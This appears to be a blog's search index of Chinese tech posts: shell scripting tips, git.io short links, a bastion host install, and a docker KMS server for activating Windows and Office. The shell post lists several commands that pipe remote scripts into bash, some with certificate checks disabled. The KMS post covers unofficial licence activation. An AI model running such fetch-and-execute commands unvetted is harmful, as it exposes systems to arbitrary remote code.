<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[shell脚本常用命令总结]]></title>
    <url>%2F2021%2F04%2F02%2F175_shell%E8%84%9A%E6%9C%AC%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[bash写shell脚本常用的一些命令总结 QQ群：397745473 让代码颜色丰富12345678910111213141516#######color code########RED="31m"GREEN="32m"YELLOW="33m"BLUE="36m"FUCHSIA="35m"colorEcho()&#123; COLOR=$1 echo -e "\033[$&#123;COLOR&#125;$&#123;@:2&#125;\033[0m"&#125;使用示例：colorEcho $YELLOW "Please run this script on x86_64 machine."参考: https://raw.githubusercontent.com/Jrohy/trojan/master/install.sh 通常调用一键远程脚本的方法123456789101112131415161718source &lt;(curl -sL https://git.io/trojan-install)wget --no-check-certificate -qO AutoDD.sh &apos;http://git.io/autodd.sh&apos; &amp;&amp; bash AutoDD.shwget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.shbash &lt;(curl -s -L https://git.io/v2ray.sh)bash &lt;(curl -L -s -k &quot;https://git.io/Jvc36&quot;)-k 允许curl使用非安全的ssl连接并且传输数据（证书不受信）curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyuncurl -sSL https://get.daocloud.io/docker | shwget -qO- https://get.docker.com/ | bashbash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/kenzok8/Trojan/master/trojan-go_install.sh)&quot; 用date打日志的方法12345678date "+【%Y-%m-%d %H:%M:%S】 The configuration file already exists!" 2&gt;&amp;1 | tee -a $logPath同时会显示日制,并且把日志追加到文件中.参考：https://raw.githubusercontent.com/vsyour/onekey/main/run.sh#将获取当前时间（恢复出厂设置）和包括换行符的文字內容輸出到文档echo -e `date '+%Y-%m-%d %H:%M:%S %A'` "\nHello World !" &gt;&gt; test.txt 获取24小时前的日期存入变量1resultsName=$(date -d @$((`date +%s`-3600*24)) &apos;+%Y%m%d&apos;) shell中各种括号的作用12345shell中各种括号的作用()、(())、[]、[[]]、&#123;&#125;参考: https://www.runoob.com/w3cnote/linux-shell-brackets-features.html参考: https://blog.csdn.net/taiyang1987912/article/details/39551385参考: https://blog.csdn.net/tg5156/article/details/19406275 shell 判断是否已安装了某个软件12345678910111213141516171819202122232425262728# 判断是否安装了nodeif ! type node &gt;/dev/null 2&gt;&amp;1; then echo 'node 未安装';else echo 'node 已安装';fi# 判断是否安装了npmif ! type npm &gt;/dev/null 2&gt;&amp;1; then Echo_Red 'npm 未安装'; exit 1;fi# 在shell中判断某个可执行程序是否存在# 参考：https://segmentfault.com/q/1010000000156870$ command -v foo &gt;/dev/null 2&gt;&amp;1 || &#123; echo &gt;&amp;2 "I require foo but it's not installed. Aborting."; exit 1; &#125;$ type foo &gt;/dev/null 2&gt;&amp;1 || &#123; echo &gt;&amp;2 "I require foo but it's not installed. Aborting."; exit 1; &#125;$ hash foo 2&gt;/dev/null || &#123; echo &gt;&amp;2 "I require foo but it's not installed. Aborting."; exit 1; &#125;if which brew 2&gt;/dev/null; then echo "brew exists!"else echo "nope, no brew installed."fi shell脚本添加crontab使用shell脚本或命令行 添加crontab 定时任务 crontab 是运维过程中常用的定时任务执行工具 ​ 一般情况下在有新的定时任务要执行时，使用crontab -e ，将打开一个vi编辑界面，配置好后保存退出，但是在自动化运维的过程中往往需要使用shell脚本或命令自动添加定时任务。 接下来结束三种（Centos）自动添加的crontab 任务的方法： 使用 crontab - 命令加载管道输出 123456789101112# crontab_job="* * * * * echo world"#添加cron_job定时任务# ( crontab -l | grep -v "$cron_job"; echo "$cron_job" ) | crontab -# 删除cron_job定时任务# ( crontab -l | grep -v"$cron_job" ) | crontab -另一例子:CRONTAB_CMD="*/1 * * * * sh $PROGRAM once &gt; /dev/null 2&gt;&amp;1 &amp;"(crontab -l 2&gt;/dev/null | grep -Fv $PROGRAM; echo "$CRONTAB_CMD") | crontab - 其中，crontab - 可以读取管道传输过来的crontab配置。 将需要添加的定时任务echo到crontab -l的结果后面，再通过管道传输给crontab - 进行加载，便完成了添加； 通过grep -v去除crontab -l 中想要删除的定时任务，再传给crontab -加载配置完成删除。 一条命令就完成了crontab任务的添加和删除，非常方便。 其他更多方法 方法一： 编辑 /var/spool/cron/用户名 文件，如： 1echo "* * * * * hostname &gt;&gt; /tmp/tmp.txt" &gt;&gt; /var/spool/cron/root 优点：简单 缺点：需要root权限 方法二： 编辑 /etc/crontab 文件, 1echo "* * * * * root hostname &gt;&gt; /tmp/tmp.txt" &gt;&gt; /etc/crontab 需要注意的是: 与常用的crontab 有点不同，/etc/crontab 需指定用名。 而且该文件定义为系统级定时任务 不建议添加非系统类定时任务，编辑该文件也需要root权限 方法三： 利用crontab -l 加 crontab file 两个命令实现自动添加 1crontab -l &gt; conf &amp;&amp; echo "* * * * * hostname &gt;&gt; /tmp/tmp.txt" &gt;&gt; conf &amp;&amp; crontab conf &amp;&amp; rm -f conf 由于crontab file会覆盖原有定时任务，所以使用 crontab -l 先导出原有任务到临时文件 “conf” 再追加新定时任务 优点：不限用户，任何有crontab权限的用户都能执行 缺点：稍微复杂 shell 字符串操作(长度,查找,替换)在做shell批处理程序时候，经常会涉及到字符串相关操作。 有很多命令语句，如：awk,sed都可以做字符串各种操作。 其实shell内置一系列操作符号，可以达到类似效果，大家知道， 使用内部操作符会省略启动外部程序等时间，因此速度会非常的快。 1原文参考：https://www.cnblogs.com/chengmo/archive/2010/10/02/1841355.html 一、判断读取字符串值 表达式 含义 ${var} 变量var的值, 与$var相同 ${var-DEFAULT} 如果var没有被声明, 那么就以$DEFAULT作为其值 * ${var:-DEFAULT} 如果var没有被声明, 或者其值为空, 那么就以$DEFAULT作为其值 * ${var=DEFAULT} 如果var没有被声明, 那么就以$DEFAULT作为其值 * ${var:=DEFAULT} 如果var没有被声明, 或者其值为空, 那么就以$DEFAULT作为其值 * ${var+OTHER} 如果var声明了, 那么其值就是$OTHER, 否则就为null字符串 ${var:+OTHER} 如果var被设置了, 那么其值就是$OTHER, 否则就为null字符串 ${var?ERR_MSG} 如果var没被声明, 那么就打印$ERR_MSG * ${var:?ERR_MSG} 如果var没被设置, 那么就打印$ERR_MSG * ${!varprefix*} 匹配之前所有以varprefix开头进行声明的变量 ${!varprefix@} 匹配之前所有以varprefix开头进行声明的变量 加入了“*” 不是意思是： 当然, 如果变量var已经被设置的话, 那么其值就是$var. [chengmo@localhost ~]$ echo ${abc-‘ok’}ok[chengmo@localhost ~]$ echo $abc [chengmo@localhost ~]$ echo ${abc=’ok’}ok[chengmo@localhost ~]$ echo $abcok 如果abc 没有声明“=” 还会给abc赋值。 [chengmo@localhost ~]$ var1=11;var2=12;var3=[chengmo@localhost ~]$ echo ${!v@}var1 var2 var3[chengmo@localhost ~]$ echo ${!v*}var1 var2 var3 ${!varprefix*}与${!varprefix@}相似，可以通过变量名前缀字符，搜索已经定义的变量,无论是否为空值。 30个Linux Shell脚本经典案例（上）1原文地址: https://zhuanlan.zhihu.com/p/161356277 编写Shell过程中注意事项： 开头加解释器：#!/bin/bash 语法缩进，使用四个空格；多加注释说明。 命名建议规则：变量名大写、局部变量小写，函数名小写，名字体现出实际作用。 默认变量是全局的，在函数中变量local指定为局部变量，避免污染其他作用域。 有两个命令能帮助我调试脚本：set -e 遇到执行非0时退出脚本，set-x 打印执行过程。 写脚本一定先测试再到生产上。 1.获取随机字符串或数字获取随机8位字符串： 123456789方法1：# echo $RANDOM |md5sum |cut -c 1-8471b94f2方法2：# openssl rand -base64 4vg3BEg==方法3：# cat /proc/sys/kernel/random/uuid |cut -c 1-8ed9e032c 获取随机8位数字： 123456789方法1：# echo $RANDOM |cksum |cut -c 1-823648321方法2：# openssl rand -base64 4 |cksum |cut -c 1-838571131方法3：# date +%N |cut -c 1-869024815 cksum：打印CRC效验和统计字节 2.定义一个颜色输出字符串函数12345678910111213141516171819202122方法1：function echo_color() &#123; if [ $1 == "green" ]; then echo -e "\033[32;40m$2\033[0m" elif [ $1 == "red" ]; then echo -e "\033[31;40m$2\033[0m" fi&#125;方法2：function echo_color() &#123; case $1 in green) echo -e "[32;40m$2[0m" ;; red) echo -e "[31;40m$2[0m" ;; *) echo "Example: echo_color red string" esac&#125; 使用方法：echo_color green “test” function关键字定义一个函数，可加或不加。 3.批量创建用户123456789101112131415161718192021222324252627282930313233#!/bin/bashDATE=$(date +%F_%T)USER_FILE=user.txtecho_color()&#123; if [ $1 == 'green' ]; then echo -e "[32;40m$2[0m" elif [ $1 == 'red' ]; then echo -e "[31;40m$2[0m" fi&#125;# 如果用户文件存在并且大小大于0就备份if [ -s $USER_FILE ]; then mv $USER_FILE $USER_FILE-$DATE.bak echo_color green "$USER_FILE exist, rename $&#123;USER_FILE&#125;-$&#123;DATE&#125;.bak"fiecho -e "User Password" &gt;&gt; $USER_FILEecho "-------------------"&gt;&gt; $USER_FILEfor USER in user&#123;1..10&#125;; do if ! id $USER &amp;&gt;/dev/null; then PASS=$(echo $RANDOM |md5sum |cut -c 1-8) useradd $USER echo $PASS |passwd --stdin $USER &amp;&gt; /dev/dell echo -e "$USER $PASS" &gt;&gt; $USER_FILE echo "$USER User create successful." else echo_color red "$USER User already exists!" fidone 4.检查软件包是否安装123456#!/bin/bashif rpm -q sysstat &amp;&gt;/dev/null; then echo "sysstat is already installed."else echo "sysstat is not installed!"fi 5.检查服务状态12345678910#!/bin/bashPORT_C=$(ss -ant |grep -c 6443)PS_C=$(ps -ef |grep kube-apiserver |grep -vc grep)if [ $PORT_C -eq 0 -o $PS_C -eq 0 ]; then echo "kube-apiserver service dowmped"else echo "kube-apiserver service running!"fi 6.检查主机存活状态123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051方法1：将错误IP放到数组里面判断是否ping失败三次#!/bin/bashfor IP in $IP_LIST; do NUM=1 while [ $NUM -le 3 ]; do if ping -c 1 $IP &amp;&gt; /dev/null; then echo "$IP Ping is successful." break else FAIL_COUNT[$NUM]=$IP let NUM++ fi done if [ $&#123;#FAIL_COUNT[*]&#125; -eq 3 ]; then echo "$&#123;FAIL_COUNT[1]&#125; Ping is failure!" unset FAIL_COUNT[*] fidone 方法2：将错误次数放到FAIL_COUNT变量里面判断是否ping失败三次#!/bin/bashfor IP in $IP_LIST; do FAIL_COUNT=0 for (( i=1;i&lt;=3;i++)); do if ping -c 1 $IP &amp;&gt;/dev/null; then echo "$IP Ping is successful." break else let FAIL_COUNT++ fi done if [ $FAIL_COUNT -eq 3 ]; then echo "$IP Ping is failure!" fidone方法3：利用for循环将ping通就跳出循环继续，如果不跳出就会走到打印ping失败#!/bin/bashping_success_status() &#123; if ping -c 1 $IP &amp;&gt;/dev/null; then echo "$IP Ping is successful." continue fi&#125;for IP in $IP_LIST; do ping_success_status ping_success_status ping_success_status echo "$IP Ping is failure!"done 7.监控CPU、内存和硬盘利用率12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!/bin/bashDATE=$(date +%F" "%H:%M)IP=$(ifconfig eth0 |awk '/netmask/ &#123;print $2&#125;')if ! which vmstat &amp;&gt; /dev/null; then echo "vmstat command no found, Please install procps package." exit 1fi## CPUUS=$(vmstat |awk 'NR==3 &#123;print $13&#125;')SY=$(vmstat |awk 'NR==3 &#123;print $14&#125;')IDLE=$(vmstat |awk 'NR==3 &#123;print $15&#125;')WAIT=$(vmstat |awk 'NR==3 &#123;print $15&#125;')USE=$(($US+$SY))if [ $USE -ge 50 ];then echo " Date: $DATE Host: $IP Problem: CPU utilization $USE"fi## MemTOTAL=$(free -m |awk '/Mem/ &#123;print $2&#125;')USE=$(free -m |awk '/Mem/ &#123;print $3&#125;')FREE=$(free -m |awk '/Mem/ &#123;print $4+$6&#125;')if [ $FREE -lt 1024 ]; then echo " Date: $DATE Host: $IP Problem: Total=$TOTAL,Use=$USE,Free=$FREE"fi#diskPART_USE=$(df -h |awk -F'[% ]+' 'BEGIN&#123;OFS="="&#125; /^\/dev/ &#123;print $1,$2,$5,$6&#125;')for i in $PART_USE; do PART=$(echo $i |cut -d"=" -f1) TOTAL=$(echo $i |cut -d "=" -f2) USE=$(echo $i |cut -d"=" -f3) MOUNT=$(echo $i |cut -d"=" -f4) if [ $USE -gt 80 ]; then echo " Date: $DATE Host: $IP Total: $TOTAL Problem: $PART=$USE($MOUNT)" fidone 8.批量主机磁盘利用率监控前提监控端和被监控端SSH免交互登录或者密钥登录。 写一个配置文件保存被监控主机SSH连接信息，文件内容格式：IP User Port 1234567891011121314151617#!/bin/bashHOST_INFO=host.infofor IP in $(awk '/^[^#]/ &#123;print $1&#125;' $HOST_INFO); do USER=$(awk -v ip=$IP 'ip==$1 &#123;print $2&#125;' $HOST_INFO) PORT=$(awk -v ip=$IP 'ip==$1 &#123;print $3&#125;' $HOST_INFO) TMP_FILE=/tmp/disk.tmp ssh -p $PORT $USER@$IP df -h &gt; $TMP_FILE USE_RATE_LIST=$(awk 'BEGIN&#123;OFS="="&#125; /^\/dev/ &#123;print $NF,int($5)&#125;' $TMP_FILE) for USE_RATE in $USE_RATE_LIST; do PART_NAME=$&#123;USE_RATE%=*&#125; ##从右到左，非贪婪匹配，匹配到的删除 USE_RATE=$&#123;USE_RATE#*=&#125; ##从左到右，非贪婪匹配，匹配到的删除 if [ $USE_RATE -ge 10 ];then echo "Warning: $IP $PART_NAME Partition usage $USE_RATE%!" fi donedone 9.检查网站可用性123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#!/bin/bash#--------------------#1）检查URL可用性#方法1：check_url() &#123; HTTP_CODE=$(curl -o /dev/null --connect-timeout 3 -s -w "%&#123;http_code&#125;" $1) if [ $HTTP_CODE -ne 200 ]; then echo "Warning: $1 Access failure!" fi&#125;#方法2：check_url_2() &#123; if ! wget -T 10 --tries=1 --spider $1 &amp;&gt;/dev/null; then#-T超时时间，--tries尝试1次，--spider爬虫模式 echo "Warning: $1 Access failure!" fi&#125;#check_url www.baidu.com#check_url_2 www.aaaa.com#2）判断三次URL可用性#思路与上面检查主机存活状态一样。#---------------------------------URL_LIST="www.baidu.com www.agasgf.com"#------#方法1：利用循环技巧，如果成功就跳出当前循环，否则执行到最后一行check_url_3() &#123; HTTP_CODE=$(curl -o /dev/null --connect-timeout 3 -s -w "%&#123;http_code&#125;" $1) if [ $HTTP_CODE -eq 200 ]; then continue fi&#125;for URL in $URL_LIST; do check_url_3 $URL check_url_3 $URL check_url_3 $URL echo "Warning: $URL Access failure!"done#------#方法2：错误次数保存到变量for URL in $URL_LIST; do FAIL_COUNT=0 for ((i=1;i&lt;=3;i++)); do HTTP_CODE=$(curl -o /dev/null --connect-timeout 3 -s -w "%&#123;http_code&#125;" $URL) if [ $HTTP_CODE -ne 200 ]; then let FAIL_COUNT++ else break fi done if [ $FAIL_COUNT -eq 3 ]; then echo "Warning: $URL Access failure!" fidone#------#方法3：错误次数保存到数组for URL in $URL_LIST;do NUM=1 unset FAIL_COUNT while [ $NUM -le 3 ]; do HTTP_CODE=$(curl -o /dev/null --connect-timeout 3 -s -w "%&#123;http_code&#125;" $URL) if [ $HTTP_CODE -ne 200 ]; then FAIL_COUNT[$NUM]=$URL let NUM++ else break fi done if [ $&#123;#FAIL_COUNT[@]&#125; -eq 3 ];then echo "Warning: $URL Access failure!" fidone 10.检查MySQL主从同步状态1234567891011#!/bin/bash USER=bakPASSWD=123456IO_SQL_STATUS=$(mysql -u$USER -p$PASSWD -e show slave statusG |awk -F: /Slave_.*_Running/&#123;gsub(": ",":");print $0&#125; ) #gsub去除冒号后面的空格for i in $IO_SQL_STATUS; do THREAD_STATUS_NAME=$&#123;i%:*&#125; THREAD_STATUS=$&#123;i#*:&#125; if [ "$THREAD_STATUS" != "Yes" ]; then echo "Error: MySQL Master-Slave $THREAD_STATUS_NAME status is $THREAD_STATUS!" fidone Shell编程必备的基础知识在linux下使用shell编程常常能够极大简化我们的工作。本文总结了Shell编程必备的基础知识。 入参和默认变量对于shell脚本而言，有些内容是专门用于处理参数的，它们都有特定的含义，例如： 123/home/shouwang/test.sh para1 para2 para3$0 $1 $2 $3脚本名 第一个参数 第三个参数 第三个参数 除此之外，还有一些其他的默认变量，例如： 12345$# 代表脚本后面跟的参数个数，前面的例子中有3个参数$@ 代表了所有参数，并且可以被遍历$* 代表了所有参数，且作为整体，和$*很像，但是有区别$$ 代表了当前脚本的进程ID$? 代表了上一条命令的退出状态 变量给变量赋值，使用等号即可，但是等号两边千万不要有空格，等号右边有空格的字符串也必须用引号引起来： 1para1=&quot;hello world&quot; #字符串直接赋给变量para1 unset用于取消变量。例如： 1unset para1 如何使用变量呢？使用变量时，需要在变量前加$，例如要打印前面para1的内容： 12echo &quot;para1 is $para1&quot;#将会输出 para1 is hello world 或者变量名两边添加大括号： 12echo &quot;para1 is $&#123;para1&#125;!&quot;#将会输出 para1 is hello world! 命令执行在shell中执行命令通常只需要像在终端一样执行命令即可，不过，如果想要命令结果打印出来的时候，这样的方式就行不通了。因此，shell的命令方式常有： 1a=`ls` #`是左上角～键，不是单引号 或者使用$，后面括号内是执行的命令： 1echo &quot;current path is $(pwd)&quot; # 另外，前面两种方式对于计算表达式也是行不通的，而要采取下面的方式： 1echo &quot;1+1=$((1+1))&quot; #打印：1+1=2 即$后面用两重括号将要计算的表达式包裹起来。 那如果要执行的命令存储在变量中呢？前面的方法都不可行了，当然括号内的内容被当成命令执行还是成立的。要使用下面的方式，例如： 12a=&quot;ls&quot;echo &quot;$($a)&quot; 但是如果字符串时多条命令的时候，上面的方式又不可行了，而要采用下面的方式： 12a=&quot;ls;pwd&quot;echo &quot;$(eval $a)&quot; 这是使用了eval，将a的内容都作为命令来执行。 条件分支一般说明，如果命令执行成功，则其返回值为0，否则为非0，因此，可以通过下面的方式判断上条命令的执行结果： 123456789if [ $? -eq 0 ]then echo &quot;success&quot;elif [ $? -eq 1 ]then echo &quot;failed,code is 1&quot;else echo &quot;other code&quot;fi case语句使用方法如下： 123456789101112131415name=&quot;aa&quot;case $name in &quot;aa&quot;) echo &quot;name is $name&quot; ;; &quot;&quot;) echo &quot;name is empty&quot; ;; &quot;bb&quot;) echo &quot;name is $name&quot; ;; *) echo &quot;other name&quot; ;;esac 初学者特别需要注意以下几点： 1234+ []前面要有空格，它里面是逻辑表达式+ if elif后面要跟then，然后才是要执行的语句+ 如果想打印上一条命令的执行结果，最好的做法是将$?赋给一个变量，因为一旦执行了一条命令$?的值就可能会变。+ case每个分支最后以两个分号结尾，最后是case反过来写，即esac。 多个条件如何使用呢，两种方式，方式一： 123if [ 10 -gt 5 -o 10 -gt 4 ];then echo &quot;10&gt;5 or 10 &gt;4&quot;fi 方式二： 123if [ 10 -gt 5 ] || [ 10 -gt 4 ];then echo &quot;10&gt;5 or 10 &gt;4&quot;fi 其中-o或者||表示或。这里也有一些常见的条件判定。 总结如下： -o or 或者，同|| -a and 与，同&amp;&amp; ! 非 整数判断： -eq 两数是否相等 -ne 两数是否不等 -gt 前者是否大于后者（greater then） -lt 前面是否小于后者（less than） -ge 前者是否大于等于后者（greater then or equal） -le 前者是否小于等于后者（less than or equal） 字符串判断str1 exp str2： -z “$str1” str1是否为空字符串 -n “$str1” str1是否不是空字符串 “$str1” == “$str2” str1是否与str2相等 “$str1” != “$str2” str1是否与str2不等 “$str1” =~ “str2” str1是否包含str2 特别注意，字符串变量最好用引号引起来，因为一旦字符串中有空格，这个表达式就错了，有兴趣的可以尝试当str1=”hello world”，而str2=”hello”的时候进行比较。 文件目录判断：filename -f $filename 是否为文件 -e $filename 是否存在 -d $filename 是否为目录 -s $filename 文件存在且不为空 ! -s $filename 文件是否为空 循环循环形式一，和Python的for in很像： 1234#遍历输出脚本的参数for i in $@; do echo $idone 循环形式二，和C语言风格很像： 123for ((i = 0 ; i &lt; 10 ; i++)); do echo $idone 循环打印0到9。 循环形式三： 123for i in &#123;1..5&#125;; do echo &quot;Welcome $i&quot;done 循环打印1到5。 循环方式四： 1234while [ &quot;$ans&quot; != &quot;yes&quot; ]do read -p &quot;please input yes to exit loop:&quot; ansdone 只有当输入yes时，循环才会退出。即条件满足时，就进行循环。 循环方式五： 12345ans=yesuntil [ $ans != &quot;yes&quot; ]do read -p &quot;please input yes to exit loop:&quot; ansdone 这里表示，只有当ans不是yes时，循环就终止。 循环方式六： 123for i in &#123;5..15..3&#125;; do echo &quot;number is $i&quot;done 每隔5打印一次，即打印5,8,11,14。 函数定义函数方式如下： 1234myfunc() &#123; echo &quot;hello world $1&quot;&#125; 或者： 1234function myfunc() &#123; echo &quot;hello world $1&quot;&#125; 函数调用： 12para1=&quot;shouwang&quot;myfunc $para1 返回值通常函数的return返回值只支持0-255，因此想要获得返回值，可以通过下面的方式。 12345function myfunc() &#123; local myresult=&apos;some value&apos; echo $myresult&#125;val=$(myfunc) #val的值为some value 通过return的方式适用于判断函数的执行是否成功： 12345678910function myfunc() &#123; #do something return 0&#125;if myfunc;then echo &quot;success&quot;else echo &quot;failed&quot;fi 注释shell通过#来注释一行内容，前面我们已经看到过了： 123456789101112131415#!/bin/bash# 这是一行注释:&apos;这是多行注释&apos;ls:&lt;&lt;EOF这也可以达到多行注释的目的EOF 日志保存脚本执行后免不了要记录日志，最常用的方法就是重定向。以下面的脚本为例： 1234#!/bin/bash#test.shlll #这个命令是没有的，因此会报错date 方式一，将标准输出保存到文件中，打印标准错误： 1./test.sh &gt; log.dat 这种情况下，如果命令执行出错，错误将会打印到控制台。所以如果你在程序中调用，这样将不会讲错误信息保存在日志中。 方式二，标准输出和标准错误都保存到日志文件中： 1./test.sh &gt; log.dat 2&gt;&amp;1 2&gt;&amp;1的含义可以参考《如何理解linuxshell中的2&gt;&amp;1》 方式三，保存日志文件的同时，也输出到控制台： 1./test.sh |tee log.dat 脚本执行最常见的执行方式前面已经看到了： 1./test.sh 其它执行方式： 1234sh test.sh #在子进程中执行sh -x test.sh #会在终端打印执行到命令，适合调试source test.sh #test.sh在父进程中执行. test.sh #不需要赋予执行权限，临时执行 脚本退出码很多时候我们需要获取脚本的执行结果，即退出状态，通常0表示执行成功，而非0表示失败。为了获得退出码，我们需要使用exit。例如： 1234567891011121314151617181920#!/bin/bashfunction myfun()&#123; if [ $# -lt 2 ] then echo &quot;para num error&quot; exit 1 fi echo &quot;ok&quot; exit 2&#125;if [ $# -lt 1 ]then echo &quot;para num error&quot; exit 1fireturnVal=`myfun aa`echo &quot;end shell&quot;exit 0 这里需要特别注意的一点是，使用 1returnVal=`myfun aa` 这样的句子执行函数，即便函数里面有exit，它也不会退出脚本执行，而只是会退出该函数，这是因为exit是退出当前进程，而这种方式执行函数，相当于fork了一个子进程，因此不会退出当前脚本。最终结果就会看到，无论你的函数参数是什么最后end shell都会打印。 12./test.sh;echo $?0 这里的0就是脚本的执行结果。 总结以上就是shell编程最基本也是最关键的内容。当然这并非全部，例如数组，字典,参数处理等都没有详细介绍，由于篇幅有限，将会在后面的文章中进行详细介绍。 QQ群：397745473]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[自定义github的短链接]]></title>
    <url>%2F2021%2F04%2F01%2F174_%E8%87%AA%E5%AE%9A%E4%B9%89github%E7%9A%84%E7%9F%AD%E9%93%BE%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[自定义github的短链接 git.io 是 GitHub 推出的一个短链接服务，只能缩短 githut.com 这个域名的网址，我们在缩短自己的 GitHub 仓库时就非常合适，并且 git.io 支持自定义短网址，不像 t.cn、url.cn 等只能随机生成。下面老王就介绍下 git.io 自定义短链接教程。 一、git.io 介绍git.io 是一个非常不错的短网址服务，由 GitHub 推出，目前只能缩短 github.com 的链接地址，很多程序员都喜欢把自己放在 GitHub 上的脚本利用 git.io 生成一个自定义的短网址。 git.io 官网：git.io 输入一个 github.com 上的地址，点击 Shorten 就可以生成一个随机的短网址： QQ群：397745473 二、git.io 自定义短网址教程上面介绍了 git.io 如何生成随机短网址，git.io 另一个特色就是可以自定义短网址，生成格式如下： 1curl -i https://git.io -F &quot;url=想要被缩短的网址&quot; -F &quot;code=自定义数值&quot; 例如我想缩短 https://github.com/flyzy2005 变成 git.io/flyzy2005，那么使用的命令就是： 1curl -i https://git.io -F &quot;url=https://github.com/flyzy2005&quot; -F &quot;code=flyzy2005&quot; 返回结果如下： 123456789101112131415161718HTTP/1.1 100 ContinueHTTP/1.1 201 CreatedServer: CowboyConnection: keep-aliveDate: Sat, 29 Feb 2020 03:16:21 GMTStatus: 201 CreatedContent-Type: text/html;charset=utf-8Location: https://git.io/flyzy2005Content-Length: 28X-Xss-Protection: 1; mode=blockX-Content-Type-Options: nosniffX-Frame-Options: SAMEORIGINX-Runtime: 0.234192X-Node: 525a3d88-1bc5-4d81-beda-d593948cc052X-Revision: 392798d237fc1aa5cd55cada10d2945773e741a8Strict-Transport-Security: max-age=31536000; includeSubDomainsVia: 1.1 vegur Location: https://git.io/flyzy2005 就是你自定义的短网址，如果你不自定义，那么 Location 就是随机的一个短链接，效果跟在 git.io 上一样。 QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实测一个可用的堡垒机开源项目]]></title>
    <url>%2F2021%2F03%2F31%2F172_%E5%AE%9E%E6%B5%8B%E4%B8%80%E4%B8%AA%E5%8F%AF%E7%94%A8%E7%9A%84%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[实测一个可用的堡垒机开源项目 Next Terminal是使用Golang和React开发的一款HTML5的远程桌面网关，具有小巧、易安装、易使用、资源占用小的特点，支持RDP、SSH、VNC和Telnet协议的连接和管理。 QQ群：397745473 Next Terminal是使用Golang和React开发的一款HTML5的远程桌面网关，具有小巧、易安装、易使用、资源占用小的特点，支持RDP、SSH、VNC和Telnet协议的连接和管理。 Next Terminal基于Apache Guacamole开发，使用到了guacd服务。 目前支持的功能有： 授权凭证管理 资产管理（支持RDP、SSH、VNC、TELNET协议） 指令管理 批量执行命令 在线会话管理（监控、强制断开） 离线会话管理（查看录屏） docker安装因为程序依赖了mysql，所以在启动时需要指定mysql的连接信息。 12345678910111213mkdir /etc/next-terminalmkdir /etc/next-terminal/recordingmkdir /etc/next-terminal/drivecat &lt;&lt;EOF &gt;&gt; /etc/next-terminal/config.yamlmysql: hostname: 172.17.0.1 port: 3306 username: root password: root database: next_terminalserver: addr: 0.0.0.0:8088EOF 项目地址： https://github.com/dushixiang/next-terminal QQ群：397745473]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker一键搭建windows激活服务器]]></title>
    <url>%2F2021%2F03%2F31%2F173_docker%E4%B8%80%E9%94%AE%E6%90%AD%E5%BB%BAwindows%E6%BF%80%E6%B4%BB%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[docker一键搭建windows激活服务器 现在自己安装Windows系统都需要激活，如果想在百度里找激活码基本上都无法激活Windows 10，网上下载的激活工具又不敢用，那么为什么不自己建一个KMS服务器呢？通过自己建的KMS服务器直接激活自己的Windows 10是不是很方便呢？ 《Docker 安装 KMS 服务器 激活Windows 10》 今天我来使用vlmcsd ，这是一款和 Microsoft 兼容的 KMS 服务器，是 KMS 服务器的一个开源实现，接下来就用 docker 来搭建一个KMS服务器。 QQ群：397745473 安装激活服务器1234567apt-get update【安装docker】apt install -y docker.io【接取docker】docker pull mikolatero/vlmcsddocker run -d -p 1688:1688 --restart=always --name=&quot;vlmcsd&quot; mikolatero/vlmcsd【进入docker】docker exec -i -t 0c5d95fcb39e /bin/bash 激活Windows获取版本 12C:\Windows\system32&gt;wmic os get captionMicrosoft Windows 10 Enterprise 1234slmgr /ipk GVLK比如激活Windows 10 企业版：slmgr /ipk NPPR9-FWDCX-D2C8J-H872K-2YT43 部分列表 GVLK 系统版本 TX9XD-98N7V-6WMQ6-BX7FG-H8Q99 Windows 10 家庭版 W269N-WFGWX-YVC9B-4J6C9-T83GX Windows 10 专业版 6TP4R-GNPTD-KYYHQ-7B7DP-J447Y Windows 10 专业教育版 NW6C2-QMPVW-D7KKK-3GKT6-VCFB2 Windows 10 教育版 YC6KT-GKW9T-YTKYR-T4X34-R7VHC Windows Server 2008 R2 标准版 N69G4-B89J2-4G8F4-WWYCC-J464C Windows Server 2019 Standard 更多GVLK在[微软官网]https://docs.microsoft.com/zh-cn/windows-server/get-started/kmsclientkeys 配置 KMS 服务器1234slmgr /skms ip:port例如：slmgr /skms 192.168.3.61:1688 设置成自己的服务器和端口号 激活 1slmgr /ato 输入之后，等几秒钟，就会激活好了。 激活Officeoffice 的 GVLK配置命令 1cscript ospp.vbs /sethst:ip``cscript ospp.obs /setprt:port 激活命令 1cscript ospp.vbs /act 通过KMS服务器就可以激活自己的windows和office了，注意：一般激活的周期是180天，以后我们再次通过服务器激活就行了。 QQ群：397745473]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker部署trojan]]></title>
    <url>%2F2021%2F03%2F30%2F171_docker%E9%83%A8%E7%BD%B2trojan%2F</url>
